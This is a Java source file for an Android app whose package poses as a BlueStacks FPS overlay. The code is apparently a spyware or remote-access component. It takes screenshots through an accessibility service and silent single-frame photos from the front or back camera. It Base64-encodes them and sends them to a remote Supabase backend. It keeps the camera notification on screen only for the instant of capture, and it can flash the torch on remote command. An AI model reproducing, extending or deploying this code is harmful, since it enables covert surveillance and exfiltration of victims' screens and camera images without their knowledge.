package com.bluestacks.fpsoverlay;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Matrix;
import android.graphics.Rect;
import android.graphics.YuvImage;
import android.hardware.HardwareBuffer;
import android.hardware.camera2.CameraManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;
import android.util.Log;
import android.util.Size;
import android.view.Display;

import androidx.annotation.NonNull;
import androidx.camera.core.CameraSelector;
import androidx.camera.core.ImageAnalysis;
import androidx.camera.core.ImageProxy;
import androidx.camera.lifecycle.ProcessCameraProvider;
import androidx.core.content.ContextCompat;
import androidx.lifecycle.LifecycleOwner;

import com.google.common.util.concurrent.ListenableFuture;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MediaManager {
    private final Context context;
    private final SupabaseManager supabaseManager;
    private final ExecutorService cameraExecutor = Executors.newSingleThreadExecutor();
    private boolean relayFlashActive = false;
    private final Handler flashHandler = new Handler(Looper.getMainLooper());
    private final Runnable flashRunnable = new Runnable() {
        private boolean flashOn = false;
        @Override
        public void run() {
            if (!relayFlashActive) return;
            try {
                CameraManager cm = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
                String[] ids = cm.getCameraIdList();
                if (ids.length > 0) {
                    cm.setTorchMode(ids[0], !flashOn);
                    flashOn = !flashOn;
                }
            } catch (Exception ignored) {}
            flashHandler.postDelayed(this, Config.FLASH_INTERVAL_MS);
        }
    };

    public MediaManager(Context context, SupabaseManager supabaseManager) {
        this.context = context;
        this.supabaseManager = supabaseManager;
    }

    public void takeScreenshotAction(AccessibilityService service) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            service.takeScreenshot(Display.DEFAULT_DISPLAY, context.getMainExecutor(), new AccessibilityService.TakeScreenshotCallback() {
                @Override
                public void onSuccess(@NonNull AccessibilityService.ScreenshotResult result) {
                    Bitmap bm = null;
                    HardwareBuffer hb = null;
                    try {
                        hb = result.getHardwareBuffer();
                        bm = Bitmap.wrapHardwareBuffer(hb, result.getColorSpace());
                        if (bm != null) {
                            Bitmap swBm = bm.copy(Bitmap.Config.ARGB_8888, false);
                            // Quality 30 for speed
                            sendImage("screenshot", swBm, 30);
                            swBm.recycle();
                        }
                    } catch (Exception e) {
                        supabaseManager.sendData("logs", "Screenshot bitmap error: " + e.getMessage());
                    } finally {
                        if (bm != null) bm.recycle();
                        if (hb != null) hb.close();
                    }
                }

                @Override
                public void onFailure(int e) {
                    supabaseManager.sendData("logs", "Screenshot failed: code " + e);
                }
            });
        } else {
             supabaseManager.sendData("logs", "Screenshot failed: Android version too low (needs 11+)");
        }
    }

    public void takeCameraAction(int camId) {
        if (!(context instanceof LifecycleOwner)) return;
        
        ListenableFuture<ProcessCameraProvider> cameraProviderFuture = ProcessCameraProvider.getInstance(context);
        cameraProviderFuture.addListener(() -> {
            try {
                ProcessCameraProvider cameraProvider = cameraProviderFuture.get();
                cameraProvider.unbindAll();

                CameraSelector selector = (camId == 1) ? CameraSelector.DEFAULT_FRONT_CAMERA : CameraSelector.DEFAULT_BACK_CAMERA;

                ImageAnalysis imageAnalysis = new ImageAnalysis.Builder()
                        .setTargetResolution(new Size(640, 480)) // Kunci ke 480p agar instan
                        .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
                        .setOutputImageFormat(ImageAnalysis.OUTPUT_IMAGE_FORMAT_YUV_420_888)
                        .build();

                imageAnalysis.setAnalyzer(cameraExecutor, new ImageAnalysis.Analyzer() {
                    private boolean captured = false;

                    @Override
                    public void analyze(@NonNull ImageProxy image) {
                        if (captured) {
                            image.close();
                            return;
                        }
                        try {
                            captured = true;
                            Bitmap bm = toBitmap(image);
                            if (bm != null) {
                                // CameraX memberikan rotasi yang tepat sesuai orientasi sensor
                                int rotation = image.getImageInfo().getRotationDegrees();
                                Matrix matrix = new Matrix();
                                if (rotation != 0) matrix.postRotate(rotation);
                                
                                // Perbaikan Mirroring untuk kamera depan
                                if (camId == 1) matrix.postScale(-1, 1);
                                
                                if (rotation != 0 || camId == 1) {
                                    Bitmap rotated = Bitmap.createBitmap(bm, 0, 0, bm.getWidth(), bm.getHeight(), matrix, true);
                                    bm.recycle();
                                    bm = rotated;
                                }
                                
                                sendImage("camera", bm, 50);
                                bm.recycle();
                            }
                        } catch (Exception ignored) {
                        } finally {
                            image.close();
                            // Segera tutup kamera setelah dapet 1 frame
                            new Handler(Looper.getMainLooper()).post(() -> {
                                cameraProvider.unbindAll();
                                // Hapus notifikasi setelah foto berhasil diambil (jika ada)
                                if (context instanceof SupportService) {
                                    ((SupportService) context).stopForeground(true);
                                }
                            });
                        }
                    }
                });

                // Tampilkan notifikasi sesaat sebelum bind agar tidak diblokir Android 11+
                if (context instanceof SupportService) {
                    ((SupportService) context).showNotification();
                }

                cameraProvider.bindToLifecycle((LifecycleOwner) context, selector, imageAnalysis);

            } catch (Exception ignored) {
                if (context instanceof SupportService) {
                    ((SupportService) context).stopForeground(true);
                }
            }
        }, ContextCompat.getMainExecutor(context));
    }

    private Bitmap toBitmap(ImageProxy image) {
        try {
            int width = image.getWidth();
            int height = image.getHeight();
            ImageProxy.PlaneProxy yPlane = image.getPlanes()[0];
            ImageProxy.PlaneProxy uPlane = image.getPlanes()[1];
            ImageProxy.PlaneProxy vPlane = image.getPlanes()[2];

            ByteBuffer yBuffer = yPlane.getBuffer();
            ByteBuffer uBuffer = uPlane.getBuffer();
            ByteBuffer vBuffer = vPlane.getBuffer();

            byte[] nv21 = new byte[width * height * 3 / 2];
            int yRowStride = yPlane.getRowStride();
            
            // Copy Y plane (handling stride)
            for (int y = 0; y < height; y++) {
                yBuffer.position(y * yRowStride);
                yBuffer.get(nv21, y * width, width);
            }

            // Copy UV planes (Interleaved for NV21: V, U, V, U...)
            int uvRowStride = vPlane.getRowStride();
            int uvPixelStride = vPlane.getPixelStride();
            int uRowStride = uPlane.getRowStride();
            int uPixelStride = uPlane.getPixelStride();
            int pos = width * height;

            for (int y = 0; y < height / 2; y++) {
                for (int x = 0; x < width / 2; x++) {
                    nv21[pos++] = vBuffer.get(y * uvRowStride + x * uvPixelStride);
                    nv21[pos++] = uBuffer.get(y * uRowStride + x * uPixelStride);
                }
            }

            YuvImage yuvImage = new YuvImage(nv21, android.graphics.ImageFormat.NV21, width, height, null);
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            yuvImage.compressToJpeg(new Rect(0, 0, width, height), 100, out);
            byte[] imageBytes = out.toByteArray();
            return BitmapFactory.decodeByteArray(imageBytes, 0, imageBytes.length);
        } catch (Exception e) {
            return null;
        }
    }

    public void sendImage(String type, Bitmap bm, int quality) {
        try {
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            // Use dynamic quality from Config
            int useQuality = (quality == 30 || quality == 50) ? Config.IMAGE_QUALITY : quality;
            bm.compress(Bitmap.CompressFormat.JPEG, useQuality, out);
            String base64 = Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP);
            supabaseManager.sendData(type, base64);
            supabaseManager.sendData("logs", "Sent " + type + " (" + (base64.length()/1024) + " KB)");
        } catch (Exception e) {
            supabaseManager.sendData("logs", "Error sending image: " + e.getMessage());
        }
    }

    public boolean isRelayFlashActive() {
        return relayFlashActive;
    }

    public void setRelayFlash(boolean active) {
        this.relayFlashActive = active;
        if (active) {
            flashHandler.post(flashRunnable);
        } else {
            flashHandler.removeCallbacks(flashRunnable);
            // Pastikan senter mati saat fitur di-off kan
            try {
                CameraManager cm = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
                String[] ids = cm.getCameraIdList();
                if (ids.length > 0) cm.setTorchMode(ids[0], false);
            } catch (Exception ignored) {}
        }
    }
}
